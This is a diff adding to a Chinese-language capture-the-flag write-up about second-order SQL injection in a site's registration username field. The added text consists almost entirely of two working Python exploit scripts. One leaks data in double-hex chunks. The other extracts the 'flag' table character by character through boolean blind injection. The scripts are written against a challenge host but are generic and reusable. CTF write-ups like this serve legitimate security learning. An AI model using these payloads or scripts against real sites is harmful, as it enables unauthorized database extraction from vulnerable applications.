@@ -358,4 +358,140 @@ Poc:
 username=0'+(select hex(hex(database())))+'0
 ```
 
+登录的话会显示``database()``双hex的效果
+
+一种是利用双hex
+
+```python
+# coding=utf-8
+import requests
+import re,binascii
+import sys
+url = "http://f4511b17-2c2d-4b8d-9d4f-16e0ed66444b.node3.buuoj.cn/"
+sql = "select * from flag"
+
+email = ["test0" + str(i) + "@aa.aa" for i in range(0,24)] #这里次数可以通过sql爆破flag长度得到，或者也可fuzz
+
+def register(email,offset):
+    payload="0'+(select substr(hex(hex(({0}))) from {1} for 10))+'0".format(sql,str(1+offset*10))
+    data = {
+        "email" : email,
+        "username" : payload,
+        "password" : "test"
+    }
+    
+    req = requests.post(url+"/register.php",data = data)
+
+def login(email):
+    data = {
+        "email" : email,
+        "password" : "test"
+    }
+    r = requests.post(url+"/login.php",data,allow_redirects=True)
+    pattern = '<span class=\"user-name\">\s*(\d{1,10})\s*<'
+    return re.findall(pattern,r.text)[0]
+
+if __name__ == '__main__':
+    raw = ''
+    
+    for email,offset in zip(email,range(0,len(email))):
+        register(email,offset)
+        test = login(email)
+        print(test)
+        raw += test
+        sys.stdout.write("[-] Double Hex : -> %s <-\r" % (raw))
+        sys.stdout.flush()
+
+    print "[+] Double Hex : -> {} <-".format(raw)
+```
+
+然后还找到另一种是利用
+
+``(select substr((%s)from(%d)for(1))='%s')``进行盲注
+
 脚本
+
+```python
+#!/usr/bin/env python2
+# -*- coding:utf-8 -*-
+
+import requests as req
+import random
+import sys
+
+URL = 'http://f4511b17-2c2d-4b8d-9d4f-16e0ed66444b.node3.buuoj.cn'
+
+
+def login(email):
+    data = {
+        "email": email,
+        "password": "123456"
+    }
+    res = req.post(URL + '/login.php', data)
+    if res.status_code != req.codes.ok :
+        return login(email)
+    if res.status_code == 200 and '1          </span>' in res.content:
+        return True
+    return False
+
+
+def reg(u, e):
+    data = {
+        "username": u,
+        "email": e,
+        "password": "123456"
+    }
+    res = req.post(URL + '/register.php', data, allow_redirects=False)
+    if res.status_code == 302:
+        return login(e)
+    return False
+table = 'qwertyuiopasdfghjklzxcvbnm'
+
+
+def b(pl):
+    email = ''.join(random.sample(table, 8)) + '@qq.com'
+    return reg(pl, email)
+
+
+def getLen(sql):
+    print("[+] Starting getLen...")
+    for i in range(1, 60):
+        sys.stdout.write("[+] Len : -> %d <-\r" % i)
+        sys.stdout.flush()
+        if b("1'and((select length((%s)))=%d)and'1" % (sql, i)):
+            print("[+] Len : -> %d <-" % i)
+            return i
+    return 0
+
+
+def getData(sql="version()"):
+    _len = getLen(sql)
+    if not _len:
+        print("[-] getLen 'Error'")
+        return False
+    print("[+] Starting getData...")
+    table = '}{1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
+    res = ''
+    for pos in range(1, _len + 1):
+        for ch in table:
+            sys.stdout.write("[+] Result : -> %s%c <-\r" % (res, ch))
+            sys.stdout.flush()
+            pl = "1'and((select substr((%s)from(%d)for(1))='%s'))and'1" % (
+                sql, pos, ch)
+            if b(pl):
+                res += ch
+                break
+    print("[+] Result : -> %s <- " % res)
+    return res
+
+# right(left(x,pos),1)
+# mid(x,pos,1)
+if __name__ == '__main__':
+    # pl = "(select substr((version())from(1)for(1))='%s')" % '5'
+    # pl = "1'and(%s)and'1" % pl
+    # print(b(pl))
+    #pl = 'version()'
+    #pl = 'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'
+    pl = "select * from flag"
+    getData(pl)
+```
